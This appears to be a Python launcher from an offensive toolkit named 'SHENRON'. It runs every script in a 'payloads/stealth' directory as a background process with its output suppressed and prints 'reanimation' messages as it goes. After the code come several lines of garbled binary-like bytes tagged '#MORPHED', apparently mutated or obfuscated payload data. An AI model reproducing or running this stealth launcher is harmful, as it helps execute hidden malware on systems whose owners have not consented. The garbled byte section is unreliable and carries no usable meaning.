from core.engine.payload_registry import register_payload

#!/usr/bin/env python3
import os
import subprocess
import time

PAYLOAD_DIR = os.path.expanduser("~/SHENRON/core/payloads/stealth")

def reanimate():
    payloads = [f for f in os.listdir(PAYLOAD_DIR) if f.endswith(".py")]
    for payload in payloads:
        full_path = os.path.join(PAYLOAD_DIR, payload)
        subprocess.Popen(["python", full_path], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        print(f"[+] Ethereal reanimation initiated: {payload}")
        time.sleep(5)

if __name__ == "__main__":
    reanimate()

¥‡Bî¨×¶8qæ<Œ¨ß ®w#MORPHED

»ª²v¥åŒ;µAçfü˜êD‹#MORPHED

}«4Ç:«Ó¶™"œà»Ñs#ûj«lßSV[ÎâF#MORPHED

*.&Ùm&
`’æLö£þÜZ!¾+Õ6ª:”ø¦#MORPHED
